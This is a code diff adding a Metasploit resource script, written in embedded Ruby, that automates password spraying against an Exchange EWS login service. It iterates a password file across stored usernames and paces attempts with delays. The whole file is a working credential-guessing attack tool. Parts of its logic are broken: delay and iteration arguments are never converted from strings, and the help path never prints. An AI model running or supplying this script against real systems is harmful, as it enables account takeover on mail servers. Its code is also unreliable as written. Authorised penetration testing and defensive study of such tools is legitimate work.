@@ -1,0 +1,91 @@
+<ruby>
+  def print_help
+    help = %q|
+    Description:
+      This Metasploit RC file can be used to automate the password spraying process against an Exchange EWS Service.
+      Before using the script, the creds datastore must already contain usernames that will be used as part of the attack.
+
+    Usage:
+      ./msfconsole -r [rc_path] [rhost] [pass_file] [delay] [iterations]
+
+    Arguments:
+      rc_path       - Full path to the RC script
+      rhost         - The host that will be the target of the attack
+      pass_file     - The path to a newline delimited file containing passwords
+      delay         - The delay in seconds between each attack
+      iterations    - The number of passwords to attempt per attack
+
+
+    Example of running:
+      msf > resource spray_owa_ews_login.rc 192.168.1.23 /tmp/passwords.txt 3600 2
+
+    Authors:
+      Sion Dafydd
+    |
+
+    help = help.gsub(/^\t/, '')
+    print_line(help)
+  end
+
+  def spray(host, passwords, delay, iterations)
+    count = 0
+    passwords.each do |password|
+      count += 1
+      print_line
+      print_line("-----===[ auxiliary/scanner/http/owa_ews_login ][ #{count}/#{passwords.length} ]===-----")
+
+      run_single('use auxiliary/scanner/http/owa_ews_login')
+      run_single("set RHOSTS #{host}")
+      run_single('set DB_ALL_USERS true')
+      run_single('set ENUM_DOMAIN false')
+      run_single("set PASSWORD #{password}")
+      run_single('run')
+
+      print_line
+      print_line("-----===[ #{Time.now.strftime('%d/%m/%Y %H:%M')} ]===-----")
+      if count % iterations == 0
+        sleep delay
+      end
+    end
+  end
+
+  begin
+    args = {}
+    if ARGV.join('') =~ /^help$/i || ARGV.join('').strip.empty?
+      args[:help] = true
+      return args
+    end
+
+    args[:rhost]      = ARGV.shift || ''
+    args[:pass_file]  = ARGV.shift || ''
+    args[:delay]      = ARGV.shift || ''
+    args[:iterations] = ARGV.shift || ''
+
+    raise ArgumentError, "Missing 'rhost' argument" if args[:rhost].empty?
+    raise ArgumentError, "Missing 'pass_file' argument" if args[:pass_file].empty?
+    raise ArgumentError, "Missing 'delay' argument" if args[:delay].empty?
+    raise ArgumentError, "Missing 'iterations' argument" if args[:iterations].empty?
+
+    if args[:help]
+      print_help
+      return
+    end
+
+    passwords = Array.new
+    File.read(args[:pass_file]).each_line do |line|
+      password = line.strip
+      passwords << password unless password.empty?
+    end
+
+    spray(args[:rhost], passwords, args[:delay], args[:iterations])
+
+  rescue ArgumentError => e
+    print_error("Invalid argument: #{e.message}")
+    return
+  rescue RuntimeError => e
+    print_error(e.message)
+    return
+  rescue ::Exception => e
+    raise e
+  end
+</ruby>
